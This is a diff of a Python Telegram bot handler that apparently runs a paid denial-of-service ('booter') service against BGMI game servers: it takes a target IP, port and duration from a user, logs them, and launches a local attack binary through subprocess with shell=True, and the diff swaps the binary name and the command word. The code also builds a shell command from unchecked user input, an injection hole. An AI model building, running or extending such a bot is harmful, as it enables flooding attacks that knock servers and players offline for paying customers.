@@ -467,11 +467,11 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/noob', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # @HACK_CHIYE GRP # Call start_attack_reply function
-                full_command = f"./sun {target} {port} {time} 1150"
+                full_command = f"./gayu {target} {port} {time} 1150"
                 subprocess.run(full_command, shell=True)
                 response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══@HACK_CHIYE═══"
         else:
-            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══@HACK_CHIYE═══"  # TABISH OFFICIAL  # Updated command syntax
+            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /noob 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /noob 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══@HACK_CHIYE═══"  # TABISH OFFICIAL  # Updated command syntax
     else:
         response = "🚫 𝗠𝗲𝘁𝗵𝗼𝗱  𝗹𝗶𝗸𝗲 𝗲𝗮𝘀𝘆 𝗯𝘂𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 🚫𝗻𝗼𝘁 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝘁𝗵𝗶𝘀 𝘄𝗼𝗿𝗱 𝗜 𝗰𝗮𝗻'𝘁 𝗵𝗲𝗹𝗽 𝘁𝗼 𝘂𝘀𝗲\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /noob \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @HACK_CHIYE\n\n═══@HACK_CHIYE═══"
 
